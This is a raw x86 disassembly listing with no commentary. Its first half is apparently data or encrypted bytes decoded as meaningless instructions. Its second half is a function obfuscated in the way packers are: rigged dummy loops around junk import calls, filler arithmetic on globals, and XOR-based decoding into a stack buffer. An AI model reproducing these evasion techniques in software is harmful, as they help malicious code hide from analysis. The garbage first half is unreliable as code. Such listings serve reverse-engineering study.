  4118d4:	sub    al,0x8b
  4118d6:	push   edi
  4118d7:	mov    ds:0x29de7573,al
  4118dc:	addr16 int3 
  4118de:	sbb    eax,0xe7ce73be
  4118e3:	sub    eax,0x43de27b6
  4118e8:	aam    0xe5
  4118ea:	cdq    
  4118eb:	pop    ebx
  4118ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118ed:	retf   0xb291
  4118f0:	mov    bl,0xb0
  4118f2:	fistp  WORD PTR [ebp+edx*2-0x2f13da03]
  4118f9:	adc    ebx,DWORD PTR [ebx]
  4118fb:	cmc    
  4118fc:	test   BYTE PTR [eax-0x3a],al
  4118ff:	cmp    ebx,DWORD PTR [edi+edi*8]
  411902:	sub    dh,BYTE PTR [ebp-0x60ba2547]
  411908:	stos   DWORD PTR es:[edi],eax
  411909:	sahf   
  41190a:	jmp    0x41192b
  41190c:	fsubr  QWORD PTR [esi+0x1a]
  41190f:	add    al,0xe2
  411911:	mov    al,ds:0x70346d0b
  411916:	daa    
  411917:	push   ss
  411918:	and    BYTE PTR [ecx+0x77ff4834],al
  41191e:	push   0xffffffd2
  411920:	lods   eax,DWORD PTR ds:[esi]
  411921:	jo     0x41190c
  411923:	ja     0x4118e1
  411925:	stos   BYTE PTR es:[edi],al
  411926:	aad    0xbc
  411928:	push   edi
  411929:	lods   eax,DWORD PTR ds:[esi]
  41192a:	lds    ebx,FWORD PTR [ecx-0x93001f8]
  411930:	jmp    0x41193c
  411932:	cli    
  411933:	daa    
  411934:	inc    esp
  411935:	sub    DWORD PTR [ebp+0x29],0x3a
  411939:	add    dl,BYTE PTR [ecx]
  41193b:	pop    esp
  41193c:	dec    ebx
  41193e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41193f:	sbb    bh,al
  411941:	loop   0x411912
  411943:	jg     0x4118f5
  411945:	push   esi
  411946:	loopne 0x4118d5
  411948:	gs mov dl,0x88
  41194b:	push   ecx
  41194c:	fstp   TBYTE PTR [edi]
  41194e:	hlt    
  41194f:	sbb    cl,BYTE PTR [ecx+0x77]
  411952:	push   ecx
  411953:	dec    ecx
  411954:	dec    esi
  411955:	push   eax
  411956:	(bad)  
  411957:	sub    DWORD PTR [ecx+edi*1-0xab55416],ebp
  41195e:	in     al,0xa2
  411960:	stos   BYTE PTR es:[edi],al
  411961:	pop    ebx
  411962:	cmp    al,BYTE PTR [ebx]
  411964:	cmp    bh,0x7f
  411967:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411969:	fnstenv [eax-0x18]
  41196c:	aam    0x85
  41196e:	adc    ch,bl
  411970:	pushf  
  411971:	xchg   edx,eax
  411972:	rcr    DWORD PTR [ebp-0x67],0x8a
  411976:	sbb    eax,0xf11a0623
  41197b:	outs   dx,DWORD PTR ds:[esi]
  41197c:	dec    edi
  41197d:	jne    0x411917
  41197f:	mov    ah,0xcf
  411981:	out    0x76,eax
  411983:	mov    esi,0x7edb1d0d
  411988:	sub    esp,eax
  41198a:	outs   dx,DWORD PTR ds:[esi]
  41198b:	lods   eax,DWORD PTR ds:[esi]
  41198c:	cli    
  41198d:	int    0x1
  41198f:	call   0xc2403420
  411994:	adc    ecx,DWORD PTR [ecx-0x7f]
  411997:	fcmovne st,st(7)
  411999:	mov    esp,0x443ef90f
  41199e:	jl     0x411969
  4119a0:	xor    eax,0x7a260752
  4119a5:	or     al,0x34
  4119a7:	xor    ebx,ebx
  4119a9:	jg     0x411997
  4119ab:	push   es
  4119ac:	in     eax,0x55
  4119ae:	retf   0x7323
  4119b1:	xchg   edi,eax
  4119b2:	out    dx,al
  4119b3:	mov    esi,gs
  4119b5:	jae    0x411950
  4119b7:	popf   
  4119b8:	data16 shl BYTE PTR [edx-0x1ba52fc7],cl
  4119bf:	addr16 aam 0x69
  4119c2:	scas   al,BYTE PTR es:[edi]
  4119c3:	out    dx,al
  4119c4:	lds    esi,FWORD PTR [ebx]
  4119c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119c7:	repz out 0x73,al
  4119ca:	cmp    DWORD PTR [ecx],edx
  4119cc:	jno    0x411994
  4119ce:	adc    bl,BYTE PTR fs:[ecx]
  4119d1:	cmc    
  4119d2:	mov    esp,0xc5a605cb
  4119d7:	sti    
  4119d8:	jmp    0x9d491254
  4119dd:	hlt    
  4119de:	fwait
  4119df:	dec    esi
  4119e0:	add    BYTE PTR [edi+eax*8-0x3],al
  4119e4:	stos   BYTE PTR es:[edi],al
  4119e5:	pusha  
  4119e6:	shr    BYTE PTR [ebx],1
  4119e8:	out    0x56,al
  4119ea:	(bad)  
  4119eb:	retf   
  4119ec:	jae    0x4119a6
  4119ee:	rol    ah,cl
  4119f0:	add    eax,eax
  4119f2:	sar    BYTE PTR [edi-0x550ed9b7],1
  4119f8:	inc    ebp
  4119f9:	xor    DWORD PTR ds:0xc019b4df,ebx
  4119ff:	cmp    BYTE PTR [ebp+edx*1+0x57],ah
  411a03:	jne    0x4119fd
  411a05:	and    al,BYTE PTR gs:[edi+0x76]
  411a09:	cmp    BYTE PTR [ebx-0x4b],bh
  411a0c:	push   esi
  411a0d:	fnsave [eax]
  411a0f:	jns    0x411a33
  411a11:	mov    cl,0x8
  411a13:	dec    ebp
  411a14:	adc    dh,BYTE PTR [ebp+ebp*4-0x18]
  411a18:	pop    ecx
  411a19:	pop    edi
  411a1a:	fimul  DWORD PTR [edx+0x7a]
  411a1d:	sub    al,0x50
  411a1f:	xchg   ebx,eax
  411a20:	ret    
  411a21:	xor    eax,DWORD PTR [edi-0x3f]
  411a24:	ss xchg edi,eax
  411a26:	adc    ebp,edx
  411a28:	(bad)  
  411a29:	and    al,0x5e
  411a2b:	push   eax
  411a2c:	pop    esp
  411a2d:	call   0xc804:0x5288bc5
  411a34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a35:	adc    eax,0x8b3180c
  411a3a:	sbb    BYTE PTR ds:0x1c3e03a7,al
  411a40:	jae    0x4119fd
  411a42:	sub    DWORD PTR [ebx],eax
  411a44:	stos   DWORD PTR es:[edi],eax
  411a45:	jecxz  0x4119ea
  411a47:	dec    edx
  411a48:	out    0xbf,eax
  411a4a:	adc    DWORD PTR [esi+0x79],edx
  411a4d:	or     ebp,DWORD PTR [eax-0x5079e18a]
  411a53:	push   edi
  411a54:	adc    esi,DWORD PTR [ebx-0x60194e4a]
  411a5a:	inc    edx
  411a5b:	lahf   
  411a5c:	ja     0x4119f3
  411a5e:	stos   BYTE PTR es:[edi],al
  411a5f:	add    BYTE PTR [ebp+ecx*2-0x1e42778f],bh
  411a66:	sub    eax,0x7f2649b6
  411a6b:	test   BYTE PTR [ecx+esi*8+0x2f],bl
  411a6f:	jge    0x411a4f
  411a71:	cmp    al,0x80
  411a73:	xchg   edx,eax
  411a74:	sub    BYTE PTR [ecx+0x49],bh
  411a77:	loopne 0x411a65
  411a79:	adc    ch,dh
  411a7b:	and    DWORD PTR [edx],ecx
  411a7d:	in     eax,dx
  411a7e:	enter  0x6d36,0xb
  411a82:	push   0xffc0d18c
  411a87:	inc    esp
  411a88:	dec    eax
  411a89:	clc    
  411a8a:	stc    
  411a8b:	and    edi,DWORD PTR [ecx-0x293f3b66]
  411a91:	aad    0xd7
  411a93:	mov    esi,0x6594877f
  411a98:	popf   
  411a99:	add    eax,0x56961ea1
  411a9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a9f:	pop    esp
  411aa0:	loopne 0x411a79
  411aa2:	mov    bh,0x89
  411aa4:	in     al,dx
  411aa5:	xor    esi,eax
  411aa7:	cmc    
  411aa8:	or     esp,esp
  411aaa:	xchg   edi,ebx
  411aac:	test   edi,edx
  411aae:	mov    eax,0x82617364
  411ab3:	icebp  
  411ab4:	pop    edx
  411ab5:	adc    DWORD PTR ds:0x95807c72,0x17
  411abc:	add    eax,0x4c4d8235
  411ac1:	inc    esp
  411ac2:	xlat   BYTE PTR ds:[ebx]
  411ac3:	inc    ecx
  411ac4:	popa   
  411ac5:	lods   eax,DWORD PTR ds:[esi]
  411ac6:	xor    al,0x3c
  411ac8:	inc    eax
  411ac9:	push   esi
  411aca:	mov    dl,0x70
  411acc:	push   DWORD PTR [edi]
  411ace:	inc    esi
  411acf:	push   0x48
  411ad1:	jge    0x411a54
  411ad3:	pop    eax
  411ad4:	dec    eax
  411ad5:	or     edi,esi
  411ad7:	adc    al,0x4f
  411ad9:	jno    0x411a5b
  411adb:	not    BYTE PTR [edi-0x7632bc06]
  411ae1:	jecxz  0x411b39
  411ae3:	repnz mov esp,0xbc778ad0
  411ae9:	mov    cl,0xc4
  411aeb:	mov    cs,WORD PTR [ebx]
  411aed:	hlt    
  411aee:	mov    ds,ecx
  411af0:	sub    eax,0x4f03d2bd
  411af5:	in     eax,dx
  411af6:	ds stos BYTE PTR es:[edi],al
  411af8:	lods   eax,DWORD PTR ds:[esi]
  411af9:	sub    dh,BYTE PTR [ecx]
  411afb:	dec    esi
  411afc:	and    ebx,edi
  411afe:	js     0x411aab
  411b00:	ja     0x411afd
  411b02:	sbb    al,0x7c
  411b04:	adc    DWORD PTR [ebx+0x67701cce],ebp
  411b0a:	and    DWORD PTR [ebp+edi*2-0x65],edx
  411b0e:	push   0x22
  411b10:	ret    0x925f
  411b13:	xchg   esi,eax
  411b14:	or     eax,0xee031cf6
  411b19:	ins    BYTE PTR es:[edi],dx
  411b1a:	xor    eax,DWORD PTR [esp+ebp*4+0x1ccd6a1]
  411b21:	(bad)  
  411b22:	sahf   
  411b23:	stc    
  411b24:	inc    edi
  411b25:	dec    esi
  411b26:	dec    eax
  411b27:	and    al,0x26
  411b29:	mov    eax,0x356766ee
  411b2e:	mov    edx,0xb1813b1e
  411b34:	leave  
  411b35:	popa   
  411b36:	add    esi,DWORD PTR [eax-0x779d4653]
  411b3c:	cmp    dh,BYTE PTR [edi-0x1d]
  411b3f:	push   eax
  411b40:	or     al,0xcc
  411b42:	sub    ebp,DWORD PTR [edx]
  411b44:	xor    ch,ch
  411b46:	dec    ecx
  411b47:	xchg   ecx,eax
  411b48:	test   eax,0xfcd582ee
  411b4d:	paddusw mm0,QWORD PTR [esi]
  411b50:	loope  0x411ba6
  411b52:	sahf   
  411b53:	sub    al,al
  411b55:	mov    ds:0x1abf4887,al
  411b5a:	test   dl,dh
  411b5c:	jg     0x411b3b
  411b5e:	jmp    0x411b8b
  411b60:	dec    ebx
  411b61:	push   0xcd8b9b36
  411b66:	mov    BYTE PTR [edi+0x829b96d],cl
  411b6c:	mov    cl,0x7a
  411b6e:	push   eax
  411b6f:	sti    
  411b70:	sbb    eax,0x928ed771
  411b75:	fst    DWORD PTR [ecx-0x46dfd9e4]
  411b7b:	or     dl,BYTE PTR [ebp-0x105c9d49]
  411b81:	push   cs
  411b82:	mov    bl,0xea
  411b84:	push   cs
  411b85:	lds    eax,FWORD PTR [ecx+0xc02cc0]
  411b8b:	(bad)  
  411b8c:	(bad)  
  411b8e:	loopne 0x411bef
  411b90:	mov    ds:0xeb512731,eax
  411b95:	repz add BYTE PTR [esi+0x5],ah
  411b99:	sbb    ebp,ebx
  411b9b:	xchg   BYTE PTR [edi+ebx*8],ch
  411b9e:	add    BYTE PTR [ecx-0x3c8193ce],0x4d
  411ba5:	pop    es
  411ba6:	les    ebp,FWORD PTR [edx-0x1c]
  411ba9:	mov    dl,0x20
  411bab:	lock push ds
  411bad:	and    eax,ecx
  411baf:	pop    edx
  411bb0:	jns    0x411b88
  411bb2:	retf   
  411bb3:	cmp    BYTE PTR gs:[edi+0x2d],ah
  411bb7:	bnd call 0xb4f74213
  411bbd:	and    ebx,DWORD PTR [ecx]
  411bbf:	nop
  411bc0:	repnz arpl WORD PTR [esp+ebx*2-0x65],si
  411bc5:	mov    ?,WORD PTR [esi+0x45]
  411bc8:	in     eax,0x61
  411bca:	lahf   
  411bcb:	enter  0xc075,0x63
  411bcf:	and    eax,0xc58ffbd4
  411bd4:	ret    0x8810
  411bd7:	add    eax,0xb09855
  411bdc:	(bad)  
  411bdd:	and    BYTE PTR [ebx-0x176bf5f8],al
  411be3:	sbb    eax,0xed73c1d0
  411be8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411be9:	add    eax,0xa246b74f
  411bee:	icebp  
  411bef:	mov    esi,DWORD PTR [ebp+0x10]
  411bf2:	mov    DWORD PTR [esi+0x8],eax
  411bf5:	mov    eax,DWORD PTR [ebp+0x18]
  411bf8:	mov    esi,DWORD PTR [ebp+0x10]
  411bfb:	mov    DWORD PTR [esi+0xc],eax
  411bfe:	mov    eax,DWORD PTR [ebp+0x1c]
  411c01:	mov    esi,DWORD PTR [ebp+0x10]
  411c04:	mov    DWORD PTR [esi+0x10],eax
  411c07:	mov    eax,DWORD PTR [ebp+0x8]
  411c0a:	xor    eax,ecx
  411c0c:	add    eax,edx
  411c0e:	pop    esi
  411c0f:	leave  
  411c10:	ret    0x18
  411c13:	push   ebp
  411c14:	mov    ebp,esp
  411c16:	sub    esp,0x9c
  411c1c:	mov    ecx,DWORD PTR [ebp+0x8]
  411c1f:	sbb    DWORD PTR ds:0x426f29,edi
  411c25:	mov    eax,0x8a9d
  411c2a:	adc    DWORD PTR ds:0x426eb5,0x24b2
  411c34:	xor    ax,WORD PTR [ecx+0x20]
  411c38:	mov    DWORD PTR ds:0x426f0d,0x19
  411c42:	cmp    DWORD PTR ds:0x426f0d,0x0
  411c49:	je     0x411c79
  411c4f:	cmp    DWORD PTR ds:0x426f0d,0x23
  411c56:	jge    0x411c79
  411c5c:	jmp    0x411c67
  411c61:	call   DWORD PTR ds:0x430a00
  411c67:	mov    ecx,DWORD PTR ds:0x426f0d
  411c6d:	dec    ecx
  411c6e:	mov    DWORD PTR ds:0x426f0d,ecx
  411c74:	jmp    0x411c42
  411c79:	mov    ecx,0x3b5f
  411c7e:	add    ax,cx
  411c81:	mov    DWORD PTR ds:0x426e85,0x19
  411c8b:	cmp    DWORD PTR ds:0x426e85,0x0
  411c92:	je     0x411ce1
  411c98:	cmp    DWORD PTR ds:0x426e85,0xc
  411c9f:	jg     0x411ce1
  411ca5:	jmp    0x411cb3
  411caa:	push   DWORD PTR [ebp-0x10]
  411cad:	call   DWORD PTR ds:0x430a3c
  411cb3:	cmp    DWORD PTR ds:0x426e85,0xd
  411cba:	jne    0x411ccf
  411cc0:	xor    ecx,ecx
  411cc2:	or     ecx,DWORD PTR ds:0x426e85
  411cc8:	dec    ecx
  411cc9:	mov    DWORD PTR ds:0x426e85,ecx
  411ccf:	mov    ecx,DWORD PTR ds:0x426e85
  411cd5:	dec    ecx
  411cd6:	mov    DWORD PTR ds:0x426e85,ecx
  411cdc:	jmp    0x411c8b
  411ce1:	movzx  eax,ax
  411ce4:	mov    ecx,DWORD PTR ds:0x426f25
  411cea:	sub    DWORD PTR ds:0x426e89,ecx
  411cf0:	mov    DWORD PTR [ebp-0x10],eax
  411cf3:	mov    BYTE PTR [ebp-0x1],0x7a
  411cf7:	lea    eax,[ebp-0x1]
  411cfa:	mov    DWORD PTR [ebp-0xc],eax
  411cfd:	mov    al,BYTE PTR [ebp-0x1]
  411d00:	mov    ecx,DWORD PTR [ebp-0xc]
  411d03:	xor    al,0x81
  411d05:	sub    DWORD PTR ds:0x426f2d,0x318c
  411d0f:	add    al,0x6
  411d11:	sub    DWORD PTR ds:0x426ef5,0x54d2
  411d1b:	mov    BYTE PTR [ecx],al
  411d1d:	and    eax,eax
  411d1f:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411d26:	push   ebx
  411d27:	and    DWORD PTR ds:0x426e8d,0x0
  411d31:	mov    ecx,DWORD PTR ds:0x426e8d
  411d37:	inc    ecx
  411d38:	mov    DWORD PTR ds:0x426e8d,ecx
  411d3e:	cmp    DWORD PTR ds:0x426e8d,0x22
  411d45:	jg     0x411d8e
  411d4b:	jmp    0x411d81
  411d50:	push   0x70b5
  411d55:	push   0x7924
  411d5a:	push   0x4ec8
  411d5f:	push   0x56ca
  411d64:	push   0x88b0
  411d69:	push   0x70c2
  411d6e:	push   0x4f11
  411d73:	push   DWORD PTR [ebp-0x1c]
  411d76:	push   0x827e
  411d7b:	call   DWORD PTR ds:0x430a04
  411d81:	cmp    DWORD PTR ds:0x426e8d,0x18
  411d88:	jb     0x411d31
  411d8e:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  411d95:	and    DWORD PTR ds:0x426ee1,0x0
  411d9f:	jmp    0x411daf
  411da4:	mov    eax,ds:0x426ee1
  411da9:	inc    eax
  411daa:	mov    ds:0x426ee1,eax
  411daf:	cmp    DWORD PTR ds:0x426ee1,0x10
  411db6:	jae    0x411e0b
  411dbc:	cmp    DWORD PTR ds:0x426ee1,0x6
  411dc3:	jb     0x411e0b
  411dc9:	jmp    0x411dee
  411dce:	push   0x426ebd
  411dd3:	push   0x863e
  411dd8:	push   DWORD PTR [ebp-0x14]
  411ddb:	push   DWORD PTR [ebp-0x28]
  411dde:	push   0x80d0
  411de3:	push   0x79b2
  411de8:	call   DWORD PTR ds:0x430a40
  411dee:	cmp    DWORD PTR ds:0x426ee1,0x5
  411df5:	jne    0x411e06
  411dfb:	mov    eax,ds:0x426ee1
  411e00:	inc    eax
  411e01:	mov    ds:0x426ee1,eax
  411e06:	jmp    0x411da4
  411e0b:	mov    ecx,DWORD PTR [ebp-0x18]
  411e0e:	push   esi
  411e0f:	mov    eax,0x75108b3
  411e14:	xor    ecx,eax
  411e16:	mov    esi,0x3272fa
  411e1b:	push   edi
  411e1c:	add    ecx,esi
  411e1e:	jmp    0x411e3e
  411e23:	not    DWORD PTR ds:0x426ea5
  411e29:	mov    dl,BYTE PTR [ebp-0x1]
  411e2c:	mov    DWORD PTR ds:0x426f25,0x1eab
  411e36:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  411e3d:	inc    ecx
  411e3e:	mov    DWORD PTR ds:0x426ee1,0x6456
  411e48:	cmp    ecx,0x40
  411e4b:	mov    DWORD PTR ds:0x426ea9,0x5cb
  411e55:	jb     0x411e23
  411e5b:	sub    DWORD PTR ds:0x426ec5,0x4698
  411e65:	mov    edx,DWORD PTR [ebp-0x18]
  411e68:	xor    edx,eax
  411e6a:	add    edx,esi
  411e6c:	mov    DWORD PTR ds:0x426ea9,0x4896
  411e76:	jmp    0x411f44
  411e7b:	mov    edi,DWORD PTR [ebp+0x8]
  411e7e:	and    DWORD PTR ds:0x426e9d,0x0
  411e88:	jmp    0x411e9a
  411e8d:	mov    ecx,DWORD PTR ds:0x426e9d
  411e93:	inc    ecx
  411e94:	mov    DWORD PTR ds:0x426e9d,ecx
  411e9a:	cmp    DWORD PTR ds:0x426e9d,0x12
  411ea1:	jae    0x411ec4
  411ea7:	cmp    DWORD PTR ds:0x426e9d,0x1f
  411eae:	jg     0x411ec4
  411eb4:	jmp    0x411ebf
  411eb9:	call   DWORD PTR ds:0x430a08
  411ebf:	jmp    0x411e8d
  411ec4:	mov    ecx,0x8a9d
  411ec9:	add    DWORD PTR ds:0x426f1d,0x3bc7
  411ed3:	xor    cx,WORD PTR [edi+edx*4+0x2]
  411ed8:	mov    edi,0x3b5f
  411edd:	or     DWORD PTR ds:0x426ec9,0x426e8d
  411ee7:	add    cx,di
  411eea:	movzx  ecx,cx
  411eed:	mov    DWORD PTR [ebp-0xc],ecx
  411ef0:	mov    ecx,DWORD PTR ds:0x426ee9
  411ef6:	sub    ecx,DWORD PTR ds:0x426e99
  411efc:	mov    DWORD PTR ds:0x426ee9,ecx
  411f02:	mov    ecx,DWORD PTR [ebp+0x8]
  411f05:	or     DWORD PTR ds:0x426f2d,0x426e89
  411f0f:	movzx  ecx,WORD PTR [ecx+edx*4]
  411f13:	adc    DWORD PTR ds:0x426ebd,0x426ef1
  411f1d:	xor    ecx,0x8a9d
  411f23:	xor    DWORD PTR ds:0x426ef5,0x426e95
  411f2d:	add    ecx,edi
  411f2f:	mov    edi,DWORD PTR [ebp-0xc]
  411f32:	mov    DWORD PTR ds:0x426f09,0x3565
  411f3c:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  411f43:	inc    edx
  411f44:	mov    ecx,0x1c2a
  411f49:	mov    ecx,DWORD PTR [ebp-0x10]
  411f4c:	cmp    edx,ecx
  411f4e:	jne    0x411e7b
  411f54:	sub    edx,0x34ee
  411f5a:	mov    ecx,DWORD PTR [ebp-0x18]
  411f5d:	xor    DWORD PTR ds:0x426ef9,ecx
  411f63:	mov    edx,DWORD PTR [ebp+0x10]
  411f66:	mov    DWORD PTR ds:0x426ec5,0x17
  411f70:	cmp    DWORD PTR ds:0x426ec5,0x0
  411f77:	je     0x411fcf
  411f7d:	cmp    DWORD PTR ds:0x426ec5,0x2
  411f84:	jl     0x411fcf
  411f8a:	jmp    0x411f9f
  411f8f:	push   0x4ca2
  411f94:	push   0x426035
  411f99:	call   DWORD PTR ds:0x430a44
  411f9f:	cmp    DWORD PTR ds:0x426ec5,0x3
  411fa6:	jne    0x411fbb
  411fac:	xor    edi,edi
  411fae:	xor    edi,DWORD PTR ds:0x426ec5
  411fb4:	dec    edi
  411fb5:	mov    DWORD PTR ds:0x426ec5,edi
  411fbb:	xor    edi,edi
  411fbd:	add    edi,DWORD PTR ds:0x426ec5
  411fc3:	dec    edi
  411fc4:	mov    DWORD PTR ds:0x426ec5,edi
  411fca:	jmp    0x411f70
  411fcf:	xor    ecx,eax
  411fd1:	mov    DWORD PTR ds:0x426f21,0x1d
  411fdb:	cmp    DWORD PTR ds:0x426f21,0x0
  411fe2:	je     0x41201c
  411fe8:	cmp    DWORD PTR ds:0x426f21,0x2c
  411fef:	jg     0x41201c
  411ff5:	jmp    0x41200a
  411ffa:	push   0x426ed5
  411fff:	push   0x3809
  412004:	call   DWORD PTR ds:0x430a48
  41200a:	mov    edi,DWORD PTR ds:0x426f21
  412010:	dec    edi
  412011:	mov    DWORD PTR ds:0x426f21,edi
  412017:	jmp    0x411fdb
  41201c:	add    ecx,esi
  41201e:	xor    edi,DWORD PTR ds:0x426ea9
  412024:	mov    DWORD PTR [edx],ecx
  412026:	mov    ecx,DWORD PTR [ebp-0x18]
  412029:	xor    ecx,eax
  41202b:	add    ecx,esi
  41202d:	and    edi,0x6cf8
  412033:	mov    DWORD PTR [ebp-0xc],ecx
  412036:	mov    DWORD PTR ds:0x426ea5,0x13
  412040:	cmp    DWORD PTR ds:0x426ea5,0x0
  412047:	je     0x41207a
  41204d:	cmp    DWORD PTR ds:0x426ea5,0x1f
  412054:	jge    0x41207a
  41205a:	jmp    0x412068
  41205f:	push   DWORD PTR [ebp-0x24]
  412062:	call   DWORD PTR ds:0x430a0c
  412068:	mov    edi,DWORD PTR ds:0x426ea5
  41206e:	dec    edi
  41206f:	mov    DWORD PTR ds:0x426ea5,edi
  412075:	jmp    0x412040
  41207a:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  412081:	mov    DWORD PTR ds:0x426ea9,0x18
  41208b:	cmp    DWORD PTR ds:0x426ea9,0x0
  412092:	je     0x4120ec
  412098:	cmp    DWORD PTR ds:0x426ea9,0xa
  41209f:	ja     0x4120ec
  4120a5:	jmp    0x4120c0
  4120aa:	push   DWORD PTR [ebp-0x28]
  4120ad:	push   0x4ee1
  4120b2:	push   DWORD PTR [ebp-0x20]
  4120b5:	push   0x56ea
  4120ba:	call   DWORD PTR ds:0x430a4c
  4120c0:	cmp    DWORD PTR ds:0x426ea9,0xb
  4120c7:	jne    0x4120da
  4120cd:	mov    ecx,DWORD PTR ds:0x426ea9
  4120d3:	dec    ecx
  4120d4:	mov    DWORD PTR ds:0x426ea9,ecx
  4120da:	mov    ecx,DWORD PTR ds:0x426ea9
  4120e0:	dec    ecx
  4120e1:	mov    DWORD PTR ds:0x426ea9,ecx
  4120e7:	jmp    0x41208b
  4120ec:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  4120f3:	adc    edi,edi
  4120f5:	mov    DWORD PTR [ebp-0x10],0xf89c95b5
  4120fc:	mov    ecx,DWORD PTR ds:0x426f19
  412102:	adc    DWORD PTR ds:0x426eb9,ecx
  412108:	mov    ecx,DWORD PTR [ebp-0x14]
  41210b:	movzx  edi,BYTE PTR ds:0x426ef5
  412112:	add    edi,DWORD PTR ds:0x426ed5
  412118:	mov    DWORD PTR ds:0x426ef5,edi
  41211e:	mov    DWORD PTR [ebp+0x8],ecx
  412121:	mov    ecx,DWORD PTR [ebp+0x8]
  412124:	mov    DWORD PTR ds:0x426eb1,0x11
  41212e:	cmp    DWORD PTR ds:0x426eb1,0x0
  412135:	je     0x4121a1
  41213b:	cmp    DWORD PTR ds:0x426eb1,0x9
  412142:	jl     0x4121a1
  412148:	jmp    0x412175
  41214d:	push   DWORD PTR [ebp-0x24]
  412150:	push   0x5b11
  412155:	push   0x5886
  41215a:	push   DWORD PTR [ebp-0xc]
  41215d:	push   DWORD PTR [ebp-0x28]
  412160:	push   0x128a
  412165:	push   0x1ff9
  41216a:	push   0x6625
  41216f:	call   DWORD PTR ds:0x430a10
  412175:	cmp    DWORD PTR ds:0x426eb1,0xa
  41217c:	jne    0x41218f
  412182:	mov    edi,DWORD PTR ds:0x426eb1
  412188:	dec    edi
  412189:	mov    DWORD PTR ds:0x426eb1,edi
  41218f:	mov    edi,DWORD PTR ds:0x426eb1
  412195:	dec    edi
  412196:	mov    DWORD PTR ds:0x426eb1,edi
  41219c:	jmp    0x41212e
  4121a1:	xor    ecx,eax
  4121a3:	and    DWORD PTR ds:0x426ebd,0x0
  4121ad:	jmp    0x4121bf
  4121b2:	mov    edi,DWORD PTR ds:0x426ebd
  4121b8:	inc    edi
  4121b9:	mov    DWORD PTR ds:0x426ebd,edi
  4121bf:	cmp    DWORD PTR ds:0x426ebd,0x14
  4121c6:	jae    0x4121e9
  4121cc:	cmp    DWORD PTR ds:0x426ebd,0x1d
  4121d3:	jle    0x4121e9
  4121d9:	jmp    0x4121e4
  4121de:	call   DWORD PTR ds:0x430a14
  4121e4:	jmp    0x4121b2
  4121e9:	add    ecx,esi
  4121eb:	mov    edi,DWORD PTR ds:0x426ec9
  4121f1:	mov    ecx,0xf641bea
  4121f6:	mov    edi,0x5a1eade
  4121fb:	mov    DWORD PTR ds:0x426ed5,0x1d19
  412205:	je     0x416e72
  41220b:	and    DWORD PTR ds:0x426e95,0x0
  412215:	jmp    0x412229
  41221a:	xor    ebx,ebx
  41221c:	xor    ebx,DWORD PTR ds:0x426e95
  412222:	inc    ebx
  412223:	mov    DWORD PTR ds:0x426e95,ebx
  412229:	cmp    DWORD PTR ds:0x426e95,0x1f
  412230:	jae    0x41225c
  412236:	cmp    DWORD PTR ds:0x426e95,0x2f
  41223d:	jl     0x41225c
  412243:	jmp    0x412257
  412248:	push   DWORD PTR [ebp-0x18]
  41224b:	push   DWORD PTR [ebp-0x18]
  41224e:	push   DWORD PTR [ebp-0x10]
  412251:	call   DWORD PTR ds:0x430a18
  412257:	jmp    0x41221a
  41225c:	mov    edx,DWORD PTR [ebp+0x8]
  41225f:	mov    ebx,DWORD PTR ds:0x426ec5
  412265:	add    ebx,DWORD PTR ds:0x426ea1
  41226b:	mov    DWORD PTR ds:0x426ec5,ebx
  412271:	mov    ebx,DWORD PTR [ebp-0x8]
  412274:	xor    edx,eax
  412276:	sbb    DWORD PTR ds:0x426ea1,0x426edd
  412280:	xor    ebx,eax
  412282:	add    DWORD PTR ds:0x426e91,0x426ec5
  41228c:	sub    edx,ebx
  41228e:	sub    edx,esi
  412290:	sbb    DWORD PTR ds:0x426eb5,edi
  412296:	xor    edx,eax
  412298:	mov    DWORD PTR [ebp+0x8],edx
  41229b:	add    edx,0x4d69
  4122a1:	mov    edx,DWORD PTR [ebp+0x8]
  4122a4:	mov    ebx,DWORD PTR [ebp-0x58]
  4122a7:	lea    edx,[ebx+edx*1+0x5708f4]
  4122ae:	mov    DWORD PTR [ebp-0x58],edx
  4122b1:	mov    edx,DWORD PTR [ebp+0x8]
  4122b4:	xor    ebx,DWORD PTR ds:0x426f05
  4122ba:	mov    ebx,DWORD PTR [ebp-0x54]
  4122bd:	and    DWORD PTR ds:0x426f11,0x6a73
  4122c7:	add    edx,0x64f89a
  4122cd:	adc    DWORD PTR ds:0x426ea5,0x426ef1
  4122d7:	imul   edx,ebx
  4122da:	or     DWORD PTR ds:0x426eed,0x7801
  4122e4:	mov    DWORD PTR [ebp-0x54],edx
  4122e7:	and    DWORD PTR ds:0x426ea9,0x0
  4122f1:	mov    edx,DWORD PTR ds:0x426ea9
  4122f7:	inc    edx
  4122f8:	mov    DWORD PTR ds:0x426ea9,edx
  4122fe:	cmp    DWORD PTR ds:0x426ea9,0xa
  412305:	ja     0x41234d
  41230b:	jmp    0x412326
  412310:	push   DWORD PTR [ebp-0x18]
  412313:	push   0x70df
  412318:	push   DWORD PTR [ebp-0x28]
  41231b:	push   0x6818
  412320:	call   DWORD PTR ds:0x430a1c
  412326:	cmp    DWORD PTR ds:0x426ea9,0x9
  41232d:	jne    0x412340
  412333:	mov    edx,DWORD PTR ds:0x426ea9
  412339:	inc    edx
  41233a:	mov    DWORD PTR ds:0x426ea9,edx
  412340:	cmp    DWORD PTR ds:0x426ea9,0x1f
  412347:	jb     0x4122f1
  41234d:	mov    edx,DWORD PTR [ebp+0x8]
  412350:	movzx  ebx,WORD PTR ds:0x426ef1
  412357:	sub    DWORD PTR ds:0x426eb9,ebx
  41235d:	mov    ebx,DWORD PTR [ebp-0x50]
  412360:	add    edx,0x242ebe9
  412366:	sbb    DWORD PTR ds:0x426ef1,0x426ee1
  412370:	and    edx,ebx
  412372:	mov    DWORD PTR [ebp-0x50],edx
  412375:	xor    edx,edx
  412377:	or     edx,DWORD PTR ds:0x426ed1
  41237d:	adc    DWORD PTR ds:0x426ec5,edx
